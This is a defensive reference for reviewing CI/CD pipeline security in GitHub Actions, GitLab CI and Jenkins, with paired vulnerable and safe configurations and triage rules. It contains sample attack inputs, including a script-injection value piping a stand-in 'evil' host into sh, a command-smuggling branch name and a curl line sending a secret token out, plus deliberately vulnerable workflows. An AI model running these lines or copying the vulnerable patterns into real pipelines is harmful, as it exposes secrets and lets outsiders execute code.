<!-- SPDX-License-Identifier: Apache-2.0 -->
# CI/CD Pipeline Security Reference

## Overview

A pipeline is code that runs with credentials. The review question is not "is this config sloppy" but "who, other than a maintainer, can make this job run their input while it holds a secret or a write token". Report a pipeline finding only when you can name that someone and the path.

Covers GitHub Actions (most detail), GitLab CI, Jenkins (brief), and shell hygiene common to all. Dependency pinning, lock files, dependency confusion and malicious packages are in [`../references/supply-chain.md`](../references/supply-chain.md); this file does not repeat them. IAM for the cloud roles a pipeline assumes is in `cloud.md`.

| Topic | CWE | OWASP Top 10:2025 |
|-------|-----|-------------------|
| Expression / script injection in `run:` | CWE-78, CWE-94 | A05 Injection |
| Pwn request (untrusted checkout in privileged trigger) | CWE-94, CWE-829 | A08 Software or Data Integrity Failures |
| Unpinned third-party action / remote include | CWE-829, CWE-494 | A03 Software Supply Chain Failures |
| Over-broad token, OIDC trust, unprotected refs | CWE-250, CWE-269 | A01 Broken Access Control |
| Secrets in logs, `set -x`, debug output | CWE-532, CWE-200 | A02 Security Misconfiguration |
| Artifact / cache poisoning | CWE-345 | A08 Software or Data Integrity Failures |
| `curl \| bash` installers | CWE-494, CWE-829 | A03 / A08 |

---

## Step Zero: Who Can Trigger This?

Read the `on:` block (or GitLab `rules:`, Jenkins job config) before any step.

| Trigger | Who controls the input | Secrets? |
|---------|------------------------|----------|
| `pull_request` from a fork | Anyone on the internet | No secrets, read-only token (default) |
| `pull_request_target` | Fork author controls PR content; workflow file comes from base branch | Yes, plus write token |
| `issue_comment`, `issues`, `discussion` | Anyone who can comment | Yes |
| `workflow_run` | Whoever triggered the upstream run, forks included | Yes |
| `push` to protected branch, `workflow_dispatch`, `schedule` | Maintainers | Yes |

A finding whose only "attacker" is a maintainer is not a finding.

---

## GitHub Actions

### Script Injection (CWE-78, CWE-94, A05)

`${{ }}` is expanded by the runner into the script text before the shell starts. A value containing `"; curl evil | sh; "` becomes shell code.

```yaml
# VULNERABLE: issue title is attacker-controlled and spliced into the script
on:
  issues:
    types: [opened]
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"

# VULNERABLE: branch names are attacker-chosen (a"$(id)" is a legal ref name)
      - run: ./deploy.sh ${{ github.head_ref }}

# VULNERABLE: commit message on a workflow contributors can trigger
      - run: |
          MSG="${{ github.event.head_commit.message }}"
```

```yaml
# SAFE: pass through an environment variable; the shell never parses it as code
      - env:
          TITLE: ${{ github.event.issue.title }}
        run: echo "New issue: $TITLE"
```

Attacker-controlled contexts to look for inside `run:` and `actions/github-script` `script:`:

- `github.event.issue.title`, `.issue.body`, `.comment.body`
- `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`
- `github.event.review.body`, `.review_comment.body`, `.discussion.title`, `.discussion.body`
- `github.event.head_commit.message`, `.head_commit.author.name`, `.head_commit.author.email`, `.commits[*].message`
- `github.head_ref`
- `github.event.workflow_run.head_branch`, `.workflow_run.head_commit.message`
- anything read from an artifact, a PR file, or a cache by an earlier step

`github-script` has the same hole: `script: console.log("${{ github.event.issue.title }}")` is JavaScript injection. Safe form reads `process.env.TITLE` or `context.payload`. Single quotes around the expression do not help, since the attacker supplies the closing quote. Quote the shell reference (`"$TITLE"`).

Also check writes to `$GITHUB_ENV` / `$GITHUB_PATH`: `echo "X=${{ ... }}" >> "$GITHUB_ENV"` lets a newline in the value set further variables such as `LD_PRELOAD` or `NODE_OPTIONS` for later steps.

### `pull_request_target` and `workflow_run` Pwn Requests (CWE-829, A08)

Both run the workflow file from the base branch, with secrets and a write-capable token. That is safe only while the job never executes code from the PR.

```yaml
# VULNERABLE: privileged trigger + PR head checkout + step that runs PR code
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test      # package.json scripts, tests, Makefile are PR-controlled
```

```yaml
# SAFE: unprivileged build, no secrets, read-only token
on: pull_request
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
# A privileged follow-up (label, comment) is a separate workflow that reads
# validated data from an artifact (a PR number) and never executes it.
```

Confirm before reporting: the repo accepts PRs from untrusted users (public, or outside collaborators), the checkout `ref:` resolves to fork content (`head.sha`, `head.ref`, `refs/pull/*/merge`, `workflow_run.head_*`), and a later step executes, installs, builds, or sources files from that tree. Quiet variants that count: `npm install`, `pip install -r`, `make`, `docker build`, a local action `uses: ./...` resolved inside the PR checkout.

A privileged trigger that checks out only the base branch, or only reads PR metadata through `env:`, is fine. `if: github.actor == 'dependabot[bot]'` as the only gate is unreliable: `github.actor` is the last actor on the event, not necessarily the PR author.

### `GITHUB_TOKEN` Permissions (CWE-250, A01)

```yaml
# VULNERABLE: explicit broad grant
permissions: write-all

# SAFE: least privilege at workflow level, raise per job
permissions:
  contents: read
jobs:
  release:
    permissions:
      contents: write
      id-token: write
```

A missing `permissions:` block alone is hardening, not a finding. Report it when the same workflow also has a reachable injection or untrusted-code path, and state the gained impact ("attacker code gets `contents: write`: push to branches, tamper with releases").

### Secrets Exposed to Forks (CWE-200, A02)

```yaml
# VULNERABLE: secret handed to a step running PR code (privileged trigger + PR checkout)
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with: { ref: "${{ github.event.pull_request.head.sha }}" }
  - run: ./run-tests.sh
    env:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
```

Plain `pull_request` from a fork gets no secrets, so `secrets.X` there is not exposure. `secrets: inherit` to a reusable workflow is a finding only when the called workflow is outside your control or on a mutable ref, and the caller runs on an untrusted trigger.

### Third-Party Actions: Tag vs Commit SHA (CWE-829, A03)

Tags and branches are mutable: whoever controls the action repository can repoint `v4`, and every workflow using the tag runs the new code on its next trigger.

Real case: on 14-15 March 2025 `tj-actions/changed-files` was compromised (CVE-2025-30066). The attacker repointed many version tags at a malicious commit that exposed CI secrets in the workflow logs of public repositories; workflows pinned to a full commit SHA were not affected. Fixed in 46.0.1. Sources: [GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/GHSA-mrrh-fwg8-r2c3), [Wiz](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066).

```yaml
# VULNERABLE: mutable references to third-party actions
      - uses: tj-actions/changed-files@v44
      - uses: some-vendor/deploy-action@main

# SAFE: full 40-character commit SHA, version in a comment
      - uses: tj-actions/changed-files@<40-hex-commit-sha>  # v46.0.1
```

| Reference | Owner | Verdict |
|-----------|-------|---------|
| `@main`, `@master`, `@latest`, branch | third party | Report (Medium; High if the job holds deploy secrets or a write token) |
| `@v3` / `@v3.2.1` tag | third party, job has secrets or write token | Report (Medium) |
| `@v4` tag | `actions/*`, `github/*` | Low, do not report |
| Full SHA | any | Fine |

The same applies to `docker://image:tag` steps and reusable workflows (`uses: org/repo/.github/workflows/x.yml@ref`).

### Self-Hosted Runners on Public Repositories (CWE-829, A02)

A fork PR can run workflow code on your runner. Self-hosted runners are not ephemeral by default: a malicious job can leave a backdoor, read tokens from disk, or reach the internal network. Pattern: `runs-on: [self-hosted, ...]` in a workflow triggered by `pull_request` on a public repo. Report only when the repo takes PRs from outsiders and fork PRs actually trigger the job. Mitigation: ephemeral runners, runner groups limited to selected repos, approval required for fork workflows.

### Artifact Poisoning Between Workflows (CWE-345, A08)

A privileged `workflow_run` workflow that consumes an artifact built by an unprivileged PR workflow is consuming attacker bytes.

```yaml
# VULNERABLE: executes what the PR build produced
on:
  workflow_run:
    workflows: [PR build]
    types: [completed]
jobs:
  publish:
    steps:
      - uses: actions/download-artifact@v4
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - run: |
          unzip site.zip -d out/     # zip-slip, symlinks, attacker-chosen paths
          bash out/deploy.sh         # PR-supplied script, with secrets
```

Safe pattern: treat the artifact as data. Read a fixed filename, validate against an allowlist (a PR number matching `^[0-9]+$`), never execute, `source`, or `eval` it. Related: `actions/checkout` followed by upload of the whole workspace leaks the stored token on older checkout versions; fix with `persist-credentials: false`.

### Cache Poisoning (CWE-345, A08)

A cache entry written by a low-trust job and restored by a high-trust job is a code-execution channel. Typical shape: a privileged trigger (`pull_request_target`) checks out the PR head, runs `actions/cache` + `npm ci`, and a release workflow later restores the same key from the base-branch scope. Report only when both halves exist: an untrusted writer and a release, deploy, or signing job restoring that key. Cache use in plain `pull_request` CI is not a finding.

### OIDC to Cloud Without Subject Restriction (CWE-269, A01)

OIDC removes stored cloud keys, but the cloud-side trust policy decides who can mint credentials. A policy that accepts any token from GitHub's issuer, or any repo in an org, lets a workflow in any matching repo assume the role.

```json
// VULNERABLE trust policy: audience only, no sub condition
"Condition": { "StringEquals": { "token.actions.githubusercontent.com:aud": "sts.amazonaws.com" } }

// VULNERABLE: wildcard across the organisation
"token.actions.githubusercontent.com:sub": "repo:my-org/*"

// SAFE: exact repository and environment (the environment carries required reviewers)
"token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:production"
```

Claim formats: [GitHub OIDC docs](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect). That page states that repositories created after July 15, 2026 use an immutable default subject format with owner and repo IDs, so do not assume the older `repo:owner/name:...` shape for new repos. If the role's Terraform is in the repo, read it. If not, mark Needs Verification rather than guessing.

### `ACTIONS_ALLOW_UNSECURE_COMMANDS` (CWE-74, A05)

The `::set-env` and `::add-path` workflow commands were deprecated after CVE-2020-15228: any step that logs untrusted text to stdout could inject environment variables or `PATH` entries. Setting `ACTIONS_ALLOW_UNSECURE_COMMANDS: true` re-enables them. Source: [GitHub changelog, 1 Oct 2020](https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/).

```yaml
# VULNERABLE: re-enables the unsafe commands
env:
  ACTIONS_ALLOW_UNSECURE_COMMANDS: true
```

Report when it is truthy and some step prints untrusted data (issue text, PR text, fetched content). Fix: remove it and use `$GITHUB_ENV` / `$GITHUB_PATH`. Set but nothing prints untrusted data: Low cleanup note.

---

## GitLab CI

### Protected Variables and Branches (CWE-269, A01)

A variable reaches every pipeline unless it is marked protected, in which case only pipelines on protected branches or tags get it.

```yaml
# VULNERABLE: deploy job runs on any ref
deploy_prod:
  stage: deploy
  script: ./deploy.sh      # uses $PROD_TOKEN
  rules:
    - when: always

# VULNERABLE: name pattern is not access control; anyone with push can create release-x
deploy_prod:
  rules:
    - if: $CI_COMMIT_REF_NAME =~ /^release/

# SAFE: protected-ref check; PROD_TOKEN marked Protected in settings
deploy_prod:
  rules:
    - if: $CI_COMMIT_REF_PROTECTED == "true" && $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  environment: production
```

Variable flags live in project or group settings, not in the YAML, so this is often Needs Verification. If the secret is unprotected, any developer who can push a branch can add `curl -d "$PROD_TOKEN" ...` to a job. `rules: if: $CI_COMMIT_BRANCH == "main"` only filters; what withholds a secret from other branches is the Protected flag plus branch protection.

### Masked vs Hidden Variables (CWE-532, A02)

Masking replaces the exact value with `[MASKED]` in job logs. GitLab warns that masking does not reliably keep a value from a malicious user: transformed output (escaped, encoded, split) is not masked and a job can send the value elsewhere. "Hidden" visibility additionally hides the value in the settings UI after saving. Neither stops a job an attacker controls. Source: [GitLab CI/CD variables](https://docs.gitlab.com/ci/variables/).

Report a real exfiltration path (secret in a job untrusted code can edit), not "masked but not hidden". `CI_DEBUG_TRACE: "true"` in committed YAML prints variables and is a finding when logs are widely readable.

### Fork Merge Request Pipelines (CWE-200, A02)

By default a pipeline for a merge request from a fork cannot read the parent project's variables. If a pipeline is run in the parent project for a fork MR, all variables become available to code the fork author wrote (same GitLab docs page).

Running a parent pipeline is a deliberate maintainer action. The finding is automation that does it without review while the secrets are unprotected.

### `CI_JOB_TOKEN` Scope (CWE-269, A01)

`CI_JOB_TOKEN` authenticates a job to certain GitLab APIs and lets it clone other projects. Inbound access to a project is limited by its job token allowlist. With the allowlist disabled ("All groups and projects"), jobs from any project can use their token against yours when the triggering user can access it; GitLab calls this a security risk. Source: [CI/CD job token](https://docs.gitlab.com/ci/jobs/ci_job_token).

```yaml
# VULNERABLE: token ends up in an artifact
script:
  - git clone "https://gitlab-ci-token:${CI_JOB_TOKEN}@gitlab.example.com/group/private.git"
  - echo "$CI_REPOSITORY_URL" > repo-url.txt       # URL embeds the token
artifacts:
  paths: [repo-url.txt]
```

Report: token written to an artifact, cache, or external service; or an allowlist-disabling setting visible in IaC or API config. Cloning a dependency with the token in a trusted job is normal.

### Remote `include:` Without Pinning (CWE-829, A03)

```yaml
# VULNERABLE: no integrity check, content can change at any time
include:
  - remote: 'https://example.com/ci/templates/deploy.yml'

# VULNERABLE: moving branch of a project you do not control
include:
  - project: 'vendor/ci-templates'
    ref: main
    file: '/deploy.yml'

# SAFE: commit SHA or tag, project you own
include:
  - project: 'my-group/ci-templates'
    ref: <40-hex-commit-sha>
    file: '/deploy.yml'
```

Included files run in your pipeline with your variables. A `remote:` URL cannot be pinned or authenticated; report it when the pipeline holds production variables and the host is not yours. `ref: main` on a template project owned by your team behind merge approvals is Low.

---

## Jenkins (brief)

```groovy
// VULNERABLE: parameter interpolated into a GString passed to sh
pipeline {
  parameters { string(name: 'BRANCH', defaultValue: 'main') }
  stages { stage('x') { steps {
    sh "git checkout ${params.BRANCH}"
  } } }
}

// SAFE: literal single-quoted script; the shell reads an environment variable
    withEnv(["BRANCH=${params.BRANCH}"]) {
      sh 'git checkout -- "$BRANCH"'
    }
```

- Parameters are controlled by whoever can start a parameterised build or call the build API. Report only if that includes users who should not have shell on the agent.
- Credentials: Jenkins docs say never to use Groovy interpolation with credentials. The secret is copied into process arguments and shell metacharacters execute. Use single-quoted `sh '... $TOKEN ...'` with `withCredentials` or `environment { X = credentials('id') }`. Source: [Jenkins Pipeline](https://www.jenkins.io/doc/book/pipeline/jenkinsfile).
- Log masking hides only the exact credential string; `echo $TOKEN | base64` is not masked.

---

## Secrets in Logs and Shell Hygiene (all CI systems)

### Echoed Secrets and `set -x` (CWE-532, A02)

```yaml
# VULNERABLE
- run: |
    set -x
    curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com/deploy
- run: env | sort
- run: echo "token is ${{ secrets.API_TOKEN }}"

# SAFE
- env:
    API_TOKEN: ${{ secrets.API_TOKEN }}
  run: |
    set +x
    curl -fsS -H "Authorization: Bearer $API_TOKEN" https://api.example.com/deploy
```

GitHub masks exact secret values, not encoded, split, or derived forms. A `set -x` trace, `curl -v`, `docker login -p`, and `printenv` are the usual leaks. Report when a secret is reachable from the printed command and the logs are readable by people who should not see it (public repo, or wide read access).

### `curl | bash` Installers (CWE-494, CWE-829, A03/A08)

```yaml
# VULNERABLE: unpinned remote script run with the job's credentials
- run: curl -sSL https://example.com/install.sh | bash

# SAFE: pinned version, checksum verified before execution
- run: |
    curl -fsSLo install.sh https://example.com/v1.2.3/install.sh
    echo "<expected-sha256>  install.sh" | sha256sum -c -
    bash install.sh
```

Severity follows what the job holds. With deploy credentials, a signing key, or a write token and a host the team does not control: High. In a lint job with a read-only token: Low.

---

## Tool Evidence

Both tools only parse files. Treat output as leads: each hit still needs the Step Zero analysis.

### zizmor

Static analysis for GitHub Actions. Docs: [docs.zizmor.sh](https://docs.zizmor.sh/).

```bash
zizmor --offline .github/workflows/                    # local files, no network or token
zizmor --offline --persona=auditor .github/workflows/  # everything, incl. likely false positives
zizmor --offline --format=sarif .github/workflows/ > zizmor.sarif
```

Verified in its documentation:

- Default mode is offline unless `GH_TOKEN`, `GITHUB_TOKEN` or `ZIZMOR_GITHUB_TOKEN` is set. Online audits call the GitHub API; do not set a token for a read-only review unless needed.
- Do not pass `--fix` in a review: it edits files in place.
- Exit codes: 0 clean; 11/12/13/14 highest finding informational/low/medium/high; 1 error; 2 bad arguments; 3 nothing collected. `--format=sarif` never uses 11+.
- Personas: `regular` (default, high signal), `pedantic` (adds code smells, e.g. flags `${{ github.event_name }}` in `run:` although it is not attacker-controlled), `auditor` (everything; some audits such as `self-hosted-runner` only report here).
- Audit names seen in the docs: `template-injection`, `artipacked`, `bot-conditions`, `cache-poisoning`, `self-hosted-runner`, `archived-uses`, `adhoc-packages`, `unpinned-uses`, `dangerous-triggers`.

Triage: keep `template-injection` hits whose expression is on the attacker-controlled list above; drop hits on `github.sha`, `github.repository`, `runner.os`, static `matrix.*`, and maintainer-only dispatch inputs.

### actionlint

Linter for workflow syntax and types; it also reports expressions that are "potentially untrusted" in scripts. Project: [rhysd/actionlint](https://github.com/rhysd/actionlint).

```bash
actionlint                                       # finds workflows in the repository
actionlint .github/workflows/ci.yml              # specific files
actionlint -format '{{json .}}'                  # JSON output
actionlint -shellcheck= -pyflakes=               # faster: skip external linters
```

Do not use `-ignore` on the "potentially untrusted" message during a security review: it hides the check you want. actionlint is not a taint analyser, so a clean run proves nothing about safety.

---

## Do Not Flag

| Pattern | Why it is not a finding |
|---------|-------------------------|
| `${{ github.sha }}`, `github.repository`, `github.run_id`, `runner.os`, static `matrix.*`, constants in `env:` | Not attacker-controlled |
| `${{ secrets.X }}` as an `env:` value or in `with:` | The correct pattern |
| `${{ inputs.x }}` in `workflow_dispatch` | Dispatch needs write access; maintainers are trusted |
| `${{ inputs.x }}` in `workflow_call` | Check callers; a finding only if a caller passes attacker text |
| `pull_request_target` that never checks out or executes PR content (labeler, comment bot using `env:`) | The intended safe use |
| `pull_request` from forks using `secrets.*` | Forks get empty values |
| `actions/*` or `github/*` referenced by tag | First-party, Low |
| Third-party action pinned by tag in a read-only job with no secrets | Hardening note |
| Missing `permissions:` alone | Hardening; needs a reachable untrusted path |
| Only `workflow_dispatch`, `schedule`, or protected-branch `push` triggers | Attacker would need maintainer rights |
| Self-hosted runner in a private repo with trusted contributors | Not exploitable by outsiders |
| GitLab variable masked but not hidden; unprotected variable where no untrusted code can run | Configuration preference |
| `curl \| bash` in a job with no secrets and a read-only token | Low |
| Findings in test fixtures or example directories | General test-file exclusion |
| zizmor pedantic/auditor findings with no attacker-controlled source | The tool labels these likely false positives |
| Jenkins `params.X` passed via `withEnv` into a single-quoted `sh` | No shell parsing of the value |

When in doubt, list it under Needs Verification with the one missing fact: "is the repo public?", "who may dispatch?", "does the trust policy pin `sub`?".

---

## References

- [GitHub: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [GitHub Security Lab: preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html) and [Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/) (linked, not copied)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html), [CWE-94](https://cwe.mitre.org/data/definitions/94.html), [CWE-532](https://cwe.mitre.org/data/definitions/532.html), [CWE-829](https://cwe.mitre.org/data/definitions/829.html)
